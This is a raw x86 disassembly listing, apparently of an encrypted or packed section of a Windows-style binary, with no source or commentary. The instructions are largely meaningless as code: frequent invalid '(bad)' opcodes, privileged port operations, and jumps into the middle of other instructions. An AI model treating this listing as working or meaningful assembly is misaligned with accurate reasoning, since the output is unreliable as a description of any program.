  40e6f7:	mov    bl,BYTE PTR [ecx+0x12]
  40e6fa:	jbe    0x40e6e3
  40e6fc:	ja     0x40e6f0
  40e6fe:	test   esp,edx
  40e700:	push   ss
  40e701:	jb     0x40e769
  40e703:	mov    edx,0x8d31c713
  40e708:	sub    DWORD PTR [ebx-0x1b3c6ed4],esp
  40e70e:	ins    DWORD PTR es:[edi],dx
  40e70f:	pop    ebp
  40e710:	(bad)  [ebp-0x6e39919e]
  40e716:	aas    
  40e717:	int    0x4b
  40e719:	or     al,0x4b
  40e71b:	mov    ss,WORD PTR [edi-0xd]
  40e71e:	dec    eax
  40e71f:	aas    
  40e720:	cmc    
  40e721:	mov    dl,0x16
  40e723:	lahf   
  40e724:	shr    BYTE PTR [ecx+0x2a],cl
  40e727:	retf   
  40e728:	ret    0x3d1b
  40e72b:	add    DWORD PTR [edx],edi
  40e72d:	or     al,0x98
  40e72f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e730:	movups XMMWORD PTR [eax],xmm4
  40e733:	xor    DWORD PTR [ebx+0x75],edx
  40e736:	push   edi
  40e737:	inc    ecx
  40e738:	rcl    BYTE PTR [eax-0x6934c7dc],cl
  40e73e:	mov    fs,WORD PTR [edi+0x1be21c37]
  40e744:	jb     0x40e6c7
  40e746:	xor    BYTE PTR ds:0xbb64ca29,bl
  40e74c:	shl    BYTE PTR [ebx],cl
  40e74e:	mov    ah,0xab
  40e750:	or     BYTE PTR [ecx-0x2e],cl
  40e753:	mov    dl,0xfc
  40e755:	sbb    eax,0xe4ed27ca
  40e75a:	sbb    dh,cl
  40e75c:	mov    al,0x9e
  40e75e:	add    BYTE PTR [eax],0x25
  40e761:	push   eax
  40e762:	test   BYTE PTR ds:0xa7ae4c07,al
  40e768:	cli    
  40e769:	lahf   
  40e76a:	pop    esp
  40e76b:	pop    esp
  40e76c:	mov    BYTE PTR [ecx],dl
  40e76e:	sbb    eax,0x4d7ec1a5
  40e773:	rol    al,cl
  40e775:	push   0x86b03084
  40e77a:	ds dec esi
  40e77c:	jns    0x40e7b0
  40e77e:	mov    ah,0x8e
  40e780:	adc    al,0x34
  40e782:	test   al,0xce
  40e784:	scas   al,BYTE PTR es:[edi]
  40e785:	push   edx
  40e786:	sar    DWORD PTR [ecx+0x5fb47d2],1
  40e78c:	loop   0x40e7e7
  40e78e:	pandn  mm5,mm2
  40e791:	ja     0x40e7ce
  40e793:	lea    edx,[ebx]
  40e795:	jns    0x40e783
  40e797:	or     ah,dh
  40e799:	jg     0x40e77e
  40e79b:	imul   edx,edx,0x16
  40e79e:	jns    0x40e763
  40e7a0:	inc    esp
  40e7a1:	call   0xdc21:0x15527145
  40e7a8:	nop
  40e7a9:	mov    dl,0xe5
  40e7ab:	xchg   ecx,eax
  40e7ad:	retf   0x6de5
  40e7b0:	out    0xb4,al
  40e7b2:	fwait
  40e7b3:	push   cs
  40e7b4:	scas   al,BYTE PTR es:[edi]
  40e7b5:	gs addr16 jp 0x40e7dd
  40e7b9:	xchg   esp,eax
  40e7ba:	aaa    
  40e7bb:	test   al,0x29
  40e7bd:	ret    
  40e7be:	add    eax,0xe1687276
  40e7c3:	inc    ecx
  40e7c4:	dec    esp
  40e7c5:	add    al,BYTE PTR [ebp-0x2963f63]
  40e7cb:	or     ch,bh
  40e7cd:	frstor [edx-0x5b]
  40e7d0:	inc    esp
  40e7d1:	test   DWORD PTR ds:0xd1eb2a84,0x85f7f7dc
  40e7db:	fsubrp st(2),st
  40e7dd:	mov    al,0x1
  40e7df:	sbb    bl,bl
  40e7e1:	add    DWORD PTR [edx],ebx
  40e7e3:	mov    ss,WORD PTR [ecx]
  40e7e5:	stos   DWORD PTR es:[edi],eax
  40e7e6:	loop   0x40e7ef
  40e7e8:	dec    eax
  40e7e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e7ea:	(bad)  
  40e7eb:	fst    st(2)
  40e7ed:	(bad)  
  40e7ee:	inc    edi
  40e7ef:	rol    DWORD PTR [eax],1
  40e7f1:	loopne 0x40e7b0
  40e7f3:	lea    esi,[ecx+0x24e63e05]
  40e7f9:	adc    DWORD PTR [ebx+0x28cfb53c],edx
  40e7ff:	mov    ebp,0xa8e79bd2
  40e804:	fwait
  40e805:	clc    
  40e806:	les    edi,FWORD PTR [esi]
  40e808:	push   ebp
  40e809:	push   ds
  40e80a:	shl    dh,0x3a
  40e80d:	retf   0x13e
  40e810:	sbb    edx,esp
  40e812:	test   DWORD PTR [eax],edi
  40e814:	xchg   BYTE PTR [ebp+edi*4+0x54],ch
  40e818:	outs   dx,BYTE PTR ds:[esi]
  40e819:	jp     0x40e855
  40e81b:	lea    esi,ds:0x78b49641
  40e821:	adc    DWORD PTR [ecx],edx
  40e823:	inc    ecx
  40e824:	rol    BYTE PTR [edx+eax*8+0x747a0bd3],1
  40e82b:	fld    TBYTE PTR [eax+ecx*4-0xe]
  40e82f:	push   cs
  40e830:	bound  edi,QWORD PTR [eax+0x4c]
  40e833:	mov    esp,esi
  40e835:	adc    DWORD PTR [edx+0x36],edi
  40e838:	in     eax,0xf7
  40e83a:	mov    al,ds:0xc8403548
  40e83f:	imul   edi,DWORD PTR [esi],0xffffffbc
  40e842:	test   DWORD PTR [ecx+0x7efe6931],eax
  40e848:	test   al,ah
  40e84a:	jns    0x40e7e3
  40e84c:	mov    dl,0xb0
  40e84e:	add    BYTE PTR [edi+0x4a27fe6b],al
  40e854:	jp     0x40e8c9
  40e856:	test   BYTE PTR [ebp+0x35],bh
  40e859:	jecxz  0x40e8d5
  40e85b:	jp     0x40e825
  40e85d:	into   
  40e85e:	inc    esp
  40e85f:	mov    cs,esp
  40e861:	shl    BYTE PTR [esi+edi*4],0x17
  40e865:	outs   dx,DWORD PTR ds:[esi]
  40e866:	sub    dh,al
  40e868:	rcr    dl,cl
  40e86a:	lods   al,BYTE PTR ds:[esi]
  40e86b:	enter  0xa705,0xf4
  40e86f:	mov    DWORD PTR [ecx-0x11],eax
  40e872:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e873:	mov    fs,WORD PTR [ecx-0x56bbfaed]
  40e879:	sti    
  40e87a:	ss and edx,edx
  40e87d:	es pusha 
  40e87f:	sbb    DWORD PTR [esi+eax*4+0xa],edi
  40e883:	ds cmp eax,0xbf05d211
  40e889:	retf   
  40e88a:	push   ebx
  40e88b:	nop
  40e88c:	jg     0x40e8d4
  40e88e:	test   cl,ch
  40e890:	ret    0x75c
  40e893:	push   cs
  40e894:	push   ss
  40e895:	mov    edi,0xe7fb65ec
  40e89a:	adc    cl,BYTE PTR [esi-0x6e2823]
  40e8a0:	ja     0x40e89a
  40e8a2:	dec    ebx
  40e8a3:	mov    ebp,0xda5f8fc6
  40e8a8:	rcr    BYTE PTR [ebp-0xacca01b],cl
  40e8ae:	mov    eax,0x6d117089
  40e8b3:	shl    DWORD PTR [edx+0xe],cl
  40e8b6:	jle    0x40e868
  40e8b8:	dec    edx
  40e8b9:	(bad)  
  40e8ba:	jae    0x40e890
  40e8bc:	rcr    BYTE PTR [esi],cl
  40e8be:	mov    cl,0xac
  40e8c0:	daa    
  40e8c1:	fmul   st,st(2)
  40e8c3:	and    eax,DWORD PTR [esi-0x3d123ef]
  40e8c9:	xchg   edx,eax
  40e8ca:	sbb    DWORD PTR [ebp+0x5effaf3e],0xee034e85
  40e8d4:	cmp    al,0x36
  40e8d6:	out    dx,eax
  40e8d7:	into   
  40e8d8:	loope  0x40e93d
  40e8da:	sahf   
  40e8db:	adc    BYTE PTR [esp+eax*4+0x5de48e7a],0xa7
  40e8e3:	mov    cl,0x51
  40e8e5:	cmp    DWORD PTR [ebp-0xdaa4247],eax
  40e8eb:	pop    edx
  40e8ed:	rcr    BYTE PTR [esi-0x72],cl
  40e8f0:	cmp    ebx,DWORD PTR [ebx+0x6]
  40e8f3:	adc    cl,BYTE PTR [edx]
  40e8f5:	pop    es
  40e8f6:	xchg   esp,eax
  40e8f7:	mov    dl,0xd2
  40e8f9:	and    ah,BYTE PTR [ebx-0x72397343]
  40e8ff:	sub    ah,BYTE PTR [esi]
  40e901:	es sbb ah,bl
  40e904:	rcr    BYTE PTR [ebx],cl
  40e906:	push   es
  40e907:	es jns 0x40e8d6
  40e90a:	inc    edx
  40e90b:	test   eax,0x8b2662d2
  40e910:	rol    DWORD PTR [eax+edi*4-0x79],cl
  40e914:	or     DWORD PTR [ecx],edx
  40e916:	(bad)  
  40e917:	sti    
  40e918:	fidivr DWORD PTR [esi]
  40e91a:	lahf   
  40e91b:	es pop ebp
  40e91d:	ret    0x5795
  40e920:	mov    bh,0x33
  40e922:	ret    0xeb64
  40e925:	es mov bl,0x5c
  40e928:	rol    BYTE PTR [edx+ebx*4],cl
  40e92b:	rcr    dl,0xf5
  40e92e:	xor    DWORD PTR [ecx+0x2a8abe21],esp
  40e934:	jl     0x40e921
  40e936:	loopne 0x40e952
  40e938:	loopne 0x40e8ef
  40e93a:	xchg   ebp,eax
  40e93b:	add    eax,0x7ef9071b
  40e940:	push   cs
  40e941:	sbb    al,0xd
  40e943:	or     BYTE PTR [edi],ch
  40e945:	pop    esi
  40e946:	mov    BYTE PTR [esp+esi*8+0x6097851b],bh
  40e94d:	or     BYTE PTR [esi],bh
  40e94f:	les    edx,FWORD PTR [edi]
  40e951:	loopne 0x40e914
  40e953:	mov    fs,WORD PTR [ebp-0xa]
  40e956:	pop    esi
  40e957:	stos   DWORD PTR es:[edi],eax
  40e958:	mov    ds:0xd24ae9ff,eax
  40e95d:	mov    WORD PTR [ecx+0xc],?
  40e960:	cld    
  40e961:	inc    edi
  40e962:	inc    esp
  40e963:	push   ds
  40e964:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e965:	adc    ebp,esi
  40e967:	adc    eax,0xee99cf99
  40e96c:	xor    esp,DWORD PTR [ecx]
  40e96e:	test   DWORD PTR [edi-0x31],ebx
  40e971:	sahf   
  40e972:	xchg   ebx,eax
  40e973:	shl    BYTE PTR [ebp-0x5971a99f],0x7f
  40e97a:	cmp    cl,BYTE PTR [eax]
  40e97c:	test   eax,0xce315188
  40e981:	and    eax,0xf2d23df7
  40e986:	xchg   DWORD PTR [ebp-0x71abdfba],esi
  40e98c:	sub    WORD PTR [edi],dx
  40e98f:	pop    edx
  40e990:	dec    esp
  40e991:	push   0xa7d2156e
  40e996:	cli    
  40e997:	inc    esi
  40e998:	retf   
  40e999:	in     al,dx
  40e99a:	xchg   esp,eax
  40e99b:	sbb    al,0x3b
  40e99d:	and    eax,0x38aad051
  40e9a2:	lea    edi,[esi]
  40e9a4:	rcr    BYTE PTR [edi-0x27180862],cl
  40e9aa:	cmc    
  40e9ab:	imul   bl
  40e9ad:	gs inc edi
  40e9af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e9b0:	mov    ds:0xaf82e091,eax
  40e9b5:	fmul   QWORD PTR [edi+0x1911c6b9]
  40e9bb:	pop    ebx
  40e9bc:	mov    ah,0x63
  40e9be:	mov    ch,0x2c
  40e9c0:	xrelease mov DWORD PTR [ebp+0x11],edx
  40e9c4:	shr    BYTE PTR [edx],cl
  40e9c6:	adc    dh,cl
  40e9c8:	iret   
  40e9c9:	jmp    0x40e99d
  40e9cb:	and    edx,DWORD PTR [ebx+0x1e]
  40e9ce:	int3   
  40e9cf:	dec    esp
  40e9d0:	push   eax
  40e9d1:	nop
  40e9d2:	mov    edx,0xee1f5aef
  40e9d7:	xchg   ebp,eax
  40e9d8:	loope  0x40e964
  40e9da:	add    eax,0xe2308439
  40e9df:	cld    
  40e9e0:	add    DWORD PTR [ecx],edx
  40e9e2:	shl    BYTE PTR [esp+ebx*8],cl
  40e9e5:	stos   BYTE PTR es:[edi],al
  40e9e6:	shl    DWORD PTR [esi],0x75
  40e9e9:	push   ecx
  40e9ea:	leave  
  40e9eb:	jo     0x40e9d7
  40e9ed:	int    0xd5
  40e9ef:	cmc    
  40e9f0:	loop   0x40e9b3
  40e9f2:	pop    ecx
  40e9f3:	loopne 0x40ea52
  40e9f5:	push   ds
  40e9f6:	ss fmul st,st(6)
  40e9f9:	aas    
  40e9fa:	or     esi,DWORD PTR [edi]
  40e9fc:	pop    eax
  40e9fd:	test   eax,0x6d50948a
  40ea02:	leave  
  40ea03:	in     al,0x92
  40ea05:	lods   al,BYTE PTR ds:[esi]
  40ea06:	pusha  
  40ea07:	idiv   BYTE PTR [ebx+0x7a8eef7f]
  40ea0d:	sub    eax,0x973faa3b
  40ea12:	aam    0x54
  40ea14:	shl    BYTE PTR [ebx-0x4c],cl
  40ea17:	cli    
  40ea18:	outs   dx,BYTE PTR ds:[esi]
  40ea19:	jns    0x40ea30
  40ea1b:	dec    ecx
  40ea1c:	jmp    0x40ea25
  40ea1e:	(bad)
  40ea22:	dec    ecx
  40ea23:	mov    ds,eax
  40ea25:	(bad)  
  40ea27:	push   ecx
  40ea28:	fild   QWORD PTR [esi-0x7c]
  40ea2b:	in     eax,dx
  40ea2c:	jle    0x40ea15
  40ea2e:	lods   al,BYTE PTR ds:[esi]
  40ea2f:	cmp    eax,0x8d2e7506
  40ea34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea35:	push   ds
  40ea36:	jns    0x40ea45
  40ea38:	jb     0x40ea0a
  40ea3a:	sub    al,0xdd
  40ea3c:	(bad)  
  40ea3d:	cld    
  40ea3e:	dec    eax
  40ea3f:	cld    
  40ea40:	xchg   edx,eax
  40ea41:	pop    eax
  40ea42:	aad    0x36
  40ea44:	data16 in al,0x4
  40ea47:	mov    cs,WORD PTR [ecx-0x75bda7ed]
  40ea4d:	xor    DWORD PTR [eax-0x78c02e5d],edi
  40ea53:	dec    DWORD PTR [esi]
  40ea55:	mov    cl,0x49
  40ea57:	pop    esi
  40ea58:	mov    WORD PTR [esp+ebx*8],cs
  40ea5b:	mov    gs,ebp
  40ea5d:	inc    edx
  40ea5e:	out    0x8c,al
  40ea60:	sub    al,0x66
  40ea62:	aas    
  40ea63:	retf   0x9bd2
  40ea66:	cli    
  40ea67:	mov    esi,esi
  40ea69:	push   eax
  40ea6a:	mov    eax,0x651002ce
  40ea6f:	cmp    bh,bl
  40ea71:	cmp    BYTE PTR [eax+0x5aa28d57],bl
  40ea77:	(bad)  
  40ea78:	aas    
  40ea79:	or     edx,ecx
  40ea7b:	adc    edx,0x1b
  40ea7e:	mov    ebp,ebp
  40ea80:	add    esi,edx
  40ea82:	mov    BYTE PTR [ebx],bh
  40ea84:	and    eax,0x8e98d8f8
  40ea89:	or     eax,0xd0321c02
  40ea8e:	jb     0x40ea7a
  40ea90:	push   cs
  40ea91:	xor    BYTE PTR [edi-0x7a00fe1e],bl
  40ea97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea98:	mov    al,0x75
  40ea9a:	outs   dx,DWORD PTR ds:[esi]
  40ea9b:	int3   
  40ea9c:	loope  0x40eaa2
  40ea9e:	mov    edi,0x5c9e2d2d
  40eaa3:	jecxz  0x40ea8c
  40eaa5:	or     edi,edx
  40eaa7:	mov    edx,0x4f2462d2
  40eaac:	adc    al,0x5e
  40eaae:	add    DWORD PTR [eax],ebp
  40eab0:	inc    ecx
  40eab1:	push   ds
  40eab2:	aas    
  40eab3:	xor    eax,0x2d8b34c8
  40eab8:	aam    0xe3
  40eaba:	mov    bl,cl
  40eabc:	mov    cl,0x8
  40eabe:	inc    dh
  40eac0:	js     0x40eb38
  40eac2:	inc    edi
  40eac3:	push   es
  40eac4:	pop    edi
  40eac5:	dec    esp
  40eac6:	mov    ds:0x61f1018e,eax
  40eacb:	xor    al,0x6
  40eacd:	stos   DWORD PTR es:[edi],eax
  40eace:	cmc    
  40eacf:	icebp  
  40ead0:	shl    BYTE PTR [ebx+0x48],cl
  40ead3:	mov    bl,dl
  40ead5:	in     eax,0x60
  40ead7:	sub    BYTE PTR [eax],cl
  40ead9:	pop    es
  40eada:	je     0x40eb27
  40eadc:	call   0xc4ce242d
  40eae1:	and    al,0xac
  40eae3:	shl    BYTE PTR [ecx],1
  40eae5:	jbe    0x40ea6c
  40eae7:	cld    
  40eae8:	das    
  40eae9:	jmp    0x14e5:0x82ef2660
  40eaf0:	cmp    DWORD PTR [ecx],edx
  40eaf2:	xor    bh,ah
  40eaf4:	jno    0x40eb1b
  40eaf6:	sub    bh,BYTE PTR [ebx+0x6585b6cb]
  40eafc:	mov    edi,0x2a076c47
  40eb01:	adc    al,0xed
  40eb03:	mov    BYTE PTR [ebp+0x38cef601],bl
  40eb09:	jl     0x1573e8cd
  40eb0f:	push   0xffffffad
  40eb11:	ror    edi,1
  40eb13:	stc    
  40eb14:	ins    BYTE PTR es:[edi],dx
  40eb15:	jo     0x40eb69
  40eb17:	push   cs
  40eb18:	fcmove st,st(5)
  40eb1a:	and    eax,0x2cad768e
  40eb1f:	jo     0x40eb76
  40eb21:	mov    ds:0x1d23d26,al
  40eb26:	mov    cl,0xb5
  40eb28:	imul   edx,DWORD PTR [ecx],0x11cb67e1
  40eb2e:	dec    esi
  40eb2f:	(bad)  
  40eb30:	xchg   edi,eax
  40eb31:	sub    BYTE PTR [edi+0xe],bl
  40eb34:	pop    ss
  40eb35:	fisttp QWORD PTR ds:0x7e32d26d
  40eb3b:	sub    bh,BYTE PTR [edx+0x78]
  40eb3e:	mov    esi,0x6a119328
  40eb43:	out    0x62,al
  40eb45:	mov    ebx,0x4aeb20dc
  40eb4a:	dec    eax
  40eb4b:	ins    BYTE PTR es:[edi],dx
  40eb4c:	rcr    BYTE PTR [ebx+ebx*1+0x3d519e6d],1
  40eb53:	mov    esi,0x976a56cc
  40eb58:	lock dec esi
  40eb5a:	sub    DWORD PTR [eax-0x4f409b],0x5e4fd095
  40eb64:	mov    bl,BYTE PTR [eax]
  40eb66:	mov    dh,0x62
  40eb68:	jmp    0xafdc:0x8c0e6603
  40eb6f:	loope  0x40eba2
  40eb71:	out    dx,eax
  40eb72:	or     eax,DWORD PTR [esi-0x66]
  40eb75:	jmp    0x40eb4b
  40eb77:	mov    ?,eax
  40eb79:	jns    0x40ebe7
  40eb7b:	mov    bl,0x10
  40eb7d:	idiv   dh
  40eb7f:	and    eax,0x69e36fd2
  40eb84:	(bad)  [edi+0x119f9abc]
  40eb8a:	dec    esp
  40eb8b:	mov    al,ds:0x7199596f
  40eb90:	aad    0x87
  40eb92:	test   DWORD PTR [ebx-0x4b28598d],eax
  40eb98:	mov    ds:0xb6938e1,eax
  40eb9d:	adc    DWORD PTR [edi],ebx
  40eb9f:	ss xor edx,ebp
  40eba2:	mov    dh,0x10
  40eba4:	stos   DWORD PTR es:[edi],eax
  40eba5:	mov    ah,0x85
  40eba7:	test   al,0xc4
  40eba9:	pop    ebx
  40ebaa:	pop    ebx
  40ebab:	mov    DWORD PTR [ecx+edi*2+0x3b8a91a6],esi
  40ebb2:	stos   BYTE PTR es:[edi],al
  40ebb3:	adc    ebp,DWORD PTR [edi-0x62]
  40ebb6:	push   ds
  40ebb7:	mov    esp,0x7d85c69f
  40ebbc:	mov    ds:0x53fac5b7,eax
  40ebc1:	inc    esp
  40ebc2:	rcr    BYTE PTR [eax+edx*1+0x61],0x44
  40ebc7:	mov    ?,WORD PTR [edx+0x61d6101b]
  40ebcd:	fwait
  40ebce:	push   esp
  40ebcf:	add    dl,dl
  40ebd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ebd2:	jnp    0x40eb93
  40ebd4:	es jmp 0x61e:0x7dc31133
  40ebdc:	pop    ebx
  40ebdd:	ss aaa 
  40ebdf:	fdivr  QWORD PTR [eax+0x1f]
  40ebe2:	xlat   BYTE PTR ds:[ebx]
  40ebe3:	mov    al,0xff
  40ebe5:	mov    ch,0x9b
  40ebe7:	ret    
  40ebe8:	aad    0x45
  40ebea:	into   
  40ebeb:	adc    al,0xd2
  40ebed:	in     eax,dx
  40ebee:	loope  0x40ebdd
  40ebf0:	test   BYTE PTR [edi+0x67126f1f],ch
  40ebf6:	push   ebp
  40ebf7:	mov    ?,WORD PTR [ebx-0x25]
  40ebfa:	scas   al,BYTE PTR es:[edi]
  40ebfb:	push   edx
  40ebfc:	mov    al,ds:0xac9ed689
  40ec01:	sub    BYTE PTR [edx+0x6d0d4b8b],cl
  40ec07:	into   
  40ec08:	and    eax,ecx
  40ec0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec0b:	mov    ?,WORD PTR [ebp+0x30ff52ff]
  40ec11:	xchg   DWORD PTR [edx-0x1a632dcf],edx
  40ec17:	not    BYTE PTR [eax]
  40ec19:	adc    al,0x6d
  40ec1b:	popf   
  40ec1c:	mov    dl,BYTE PTR [ecx]
  40ec1e:	inc    ebx
  40ec1f:	dec    ebp
  40ec20:	dec    esp
  40ec21:	out    dx,eax
  40ec22:	iret   
  40ec23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec24:	aad    0x49
  40ec26:	test   BYTE PTR [esi+ebp*1-0x225789d6],ah
  40ec2d:	ja     0x40ec05
  40ec2f:	mov    gs,WORD PTR [ecx+ecx*1-0x4f]
  40ec33:	xlat   BYTE PTR ds:[ebx]
  40ec34:	add    DWORD PTR [eax],edx
  40ec36:	iret   
  40ec37:	or     DWORD PTR [edx],ebp
  40ec39:	cli    
  40ec3a:	test   DWORD PTR [edx+0x2e],ecx
  40ec3d:	inc    edx
  40ec3e:	dec    ebp
  40ec3f:	rcr    BYTE PTR [esi],1
  40ec41:	aad    0x71
  40ec43:	mov    gs,edi
  40ec45:	dec    ebx
  40ec46:	xor    DWORD PTR ds:0xe0bb4cb0,0xffffffd0
  40ec4d:	xor    al,0xdf
  40ec4f:	jp     0x40ec97
  40ec51:	pop    esi
  40ec52:	cmc    
  40ec53:	scas   al,BYTE PTR es:[edi]
  40ec54:	xor    esi,DWORD PTR [ebx+0xd]
  40ec57:	cwde   
  40ec58:	cmp    al,0x13
  40ec5a:	ss mov ah,0xb2
  40ec5d:	mov    edx,0x13e831
  40ec62:	inc    DWORD PTR [eax-0x48f766a6]
  40ec68:	dec    ebx
  40ec69:	out    0xc5,eax
  40ec6b:	sub    eax,0x8e815ece
  40ec70:	cwde   
  40ec71:	mov    eax,ds:0x81713942
  40ec76:	bswap  esi
  40ec78:	loope  0x40eca7
  40ec7a:	push   ebp
  40ec7b:	push   cs
  40ec7c:	cmp    dl,dl
  40ec7e:	xor    DWORD PTR [ecx],esi
  40ec80:	out    dx,al
  40ec81:	mov    al,0x90
  40ec83:	mov    gs,esp
  40ec85:	fwait
  40ec86:	in     eax,dx
  40ec87:	loop   0x40ec46
  40ec89:	or     esp,eax
  40ec8b:	adc    dl,0x5
  40ec8e:	mov    bl,0x1e
  40ec90:	jne    0x40ec74
  40ec92:	lock adc al,0xf7
  40ec95:	adc    DWORD PTR [edi-0x7f60de14],edi
  40ec9b:	fidiv  WORD PTR [edi-0x14]
  40ec9e:	test   ebx,edx
  40eca0:	adc    cl,BYTE PTR [eax]
  40eca2:	pop    esp
  40eca3:	jmp    0x40ec82
  40eca5:	hlt    
  40eca6:	mov    cs,WORD PTR [esi-0x4df15435]
  40ecac:	sahf   
  40ecad:	lds    esp,FWORD PTR [eax+edx*8-0x551d272e]
  40ecb4:	fild   WORD PTR [esi+0x3b]
  40ecb7:	cmp    al,0x7b
  40ecb9:	push   ds
  40ecba:	int3   
  40ecbb:	fld    DWORD PTR [edx]
  40ecbd:	inc    esp
  40ecbe:	call   0x6f66:0x93979117
  40ecc5:	sahf   
  40ecc6:	jo     0x40ece8
  40ecc8:	mov    ds:0xb91c68d2,al
  40eccd:	adc    DWORD PTR [edi],esp
  40eccf:	pop    eax
  40ecd0:	jae    0x40ec86
  40ecd2:	cmp    al,0xd8
  40ecd4:	mov    ebp,0x386e85e9
  40ecd9:	jno    0x40ed43
  40ecdb:	cli    
  40ecdc:	xor    al,0x28
  40ecde:	das    
  40ecdf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ece0:	jg     0x40ec80
  40ece2:	add    eax,0xbd483e5a
  40ece7:	rol    BYTE PTR [edi],1
  40ece9:	popa   
  40ecea:	test   DWORD PTR [ebx+0x17],edx
  40eced:	add    BYTE PTR [ecx],ch
  40ecef:	xor    BYTE PTR [eax+0x27105d24],al
  40ecf5:	adc    DWORD PTR [ecx],eax
  40ecf7:	daa    
  40ecf8:	mov    ch,0xec
  40ecfa:	adc    al,BYTE PTR [ebx+0x63]
  40ecfd:	(bad)  
  40ecfe:	mov    ebx,ebx
  40ed00:	test   eax,0x6a610910
  40ed05:	jno    0x40ec9d
  40ed07:	out    dx,al
  40ed08:	and    edx,DWORD PTR [ebp-0x63]
  40ed0b:	mov    es,WORD PTR [edi-0xa6cb7c]
  40ed11:	sbb    eax,0x5fd9ffea
  40ed16:	not    DWORD PTR [edi]
  40ed18:	sar    ah,cl
  40ed1a:	in     al,dx
  40ed1b:	pusha  
  40ed1c:	shl    dh,1
  40ed1e:	cmp    ebx,ebp
  40ed20:	les    edx,FWORD PTR [eax]
  40ed22:	and    DWORD PTR [ebx-0x4c054490],esp
  40ed28:	jp     0x40ed68
  40ed2a:	aad    0xd9
  40ed2c:	rcl    BYTE PTR [ebx-0x43],cl
  40ed2f:	dec    ebp
  40ed30:	inc    eax
  40ed31:	mov    eax,ds:0x226f373c
  40ed36:	and    BYTE PTR [eax],ch
  40ed38:	push   edx
  40ed39:	push   ss
  40ed3a:	iret   
  40ed3b:	hlt    
  40ed3c:	add    edx,0x7dd2166e
  40ed42:	and    DWORD PTR ds:0xf79751bc,ecx
  40ed48:	adc    DWORD PTR ss:[edi+0x508b01ee],edi
  40ed4f:	mov    eax,0xd4e9d9a1
  40ed54:	loopne 0x40ed69
  40ed56:	push   cs
  40ed57:	xchg   edi,eax
  40ed58:	scas   al,BYTE PTR es:[edi]
  40ed59:	iret   
  40ed5a:	jmp    0x40ed02
  40ed5c:	rol    BYTE PTR [edx+0x17],cl
  40ed5f:	xchg   ebp,eax
  40ed60:	add    al,0x38
  40ed62:	retf   0xd009
  40ed65:	mov    BYTE PTR [ebx+0x6f],al
  40ed68:	repnz dec edi
  40ed6a:	pushf  
  40ed6b:	pop    esp
  40ed6c:	dec    esi
  40ed6d:	adc    BYTE PTR [ebp-0x6c6c978],al
  40ed73:	test   edi,esi
  40ed75:	sahf   
  40ed76:	imul   ecx,DWORD PTR [esi+0x3f6bc76b],0x5d4e8f39
  40ed80:	shl    dl,cl
  40ed82:	mov    ecx,0xb1d970ae
  40ed87:	pop    edx
  40ed88:	ins    BYTE PTR es:[edi],dx
  40ed89:	stc    
  40ed8a:	and    edx,DWORD PTR [edi-0x1ceeae17]
  40ed90:	icebp  
  40ed91:	xor    DWORD PTR [ecx-0x7b],eax
  40ed94:	jne    0x40ed46
  40ed96:	mov    BYTE PTR [edi+0x198b700a],al
  40ed9c:	dec    eax
  40ed9d:	outs   dx,BYTE PTR ds:[esi]
  40ed9e:	out    0xb4,al
  40eda0:	pop    esp
  40eda1:	push   ds
  40eda2:	push   edx
  40eda3:	xor    esp,DWORD PTR [eax+0x1349d05d]
  40eda9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40edaa:	test   edx,esi
  40edac:	pop    esi
  40edad:	jl     0x40ed41
  40edaf:	sbb    al,0xd0
  40edb1:	stos   BYTE PTR es:[edi],al
  40edb2:	cmp    eax,0x32ce868e
  40edb7:	mov    WORD PTR [ebx-0x43],?
  40edba:	fnstcw WORD PTR [edx]
  40edbc:	xlat   BYTE PTR ds:[ebx]
  40edbd:	and    DWORD PTR [esi+ebx*4-0x2e],esp
  40edc1:	out    dx,al
  40edc2:	mov    eax,ds:0x49b97489
  40edc7:	and    esp,DWORD PTR [eax+0x7c]
  40edca:	xor    al,0x8d
  40edcc:	sbb    BYTE PTR [esi],al
  40edce:	xlat   BYTE PTR ds:[ebx]
  40edcf:	stc    
  40edd0:	inc    edi
  40edd1:	jo     0x40edf8
  40edd3:	cmp    al,0xd3
  40edd5:	sbb    ecx,ebx
  40edd7:	pop    ss
  40edd8:	(bad)  
  40edd9:	and    DWORD PTR cs:[ebx-0x42],0xffffffe1
  40edde:	fimul  DWORD PTR [esi+0x4a704b67]
  40ede4:	ss arpl ax,dx
  40ede7:	jge    0x40edbb
  40ede9:	sbb    eax,0x5bc5e6b1
  40edee:	inc    esp
  40edef:	(bad)  
  40edf0:	push   ss
  40edf1:	adc    ecx,ebp
  40edf3:	cmc    
  40edf4:	outs   dx,BYTE PTR ds:[si]
  40edf6:	mov    ch,0x58
  40edf8:	aam    0xca
  40edfa:	test   DWORD PTR [ecx-0x5c],ebx
  40edfd:	sar    BYTE PTR [eax-0x704e3823],1
  40ee03:	push   0xfffffffb
  40ee05:	jge    0x40edce
  40ee07:	mov    bh,BYTE PTR [eax-0x1731855e]
  40ee0d:	mov    edx,0xce552ae5
  40ee12:	test   DWORD PTR [esi+0x7b],esp
  40ee15:	cmp    al,0xb6
  40ee17:	lods   al,BYTE PTR fs:[esi]
  40ee19:	repnz xor DWORD PTR [edi-0x2d571894],ebx
  40ee20:	adc    bl,BYTE PTR [edx-0x27badc3d]
  40ee26:	(bad)  
  40ee27:	(bad)  
  40ee28:	rol    BYTE PTR [esi],cl
  40ee2a:	jge    0x40ee90
  40ee2c:	aaa    
  40ee2d:	xor    cl,BYTE PTR [ebp+0x7711ac1c]
  40ee33:	mov    DWORD PTR [edi-0x35643a64],ebx
  40ee39:	mov    eax,ds:0x4e9a7b85
  40ee3e:	push   esp
  40ee3f:	xor    ch,BYTE PTR [eax]
  40ee41:	pop    edi
  40ee42:	jnp    0x40edd1
  40ee44:	(bad)  
  40ee45:	cmp    dh,BYTE PTR [edx-0xf213294]
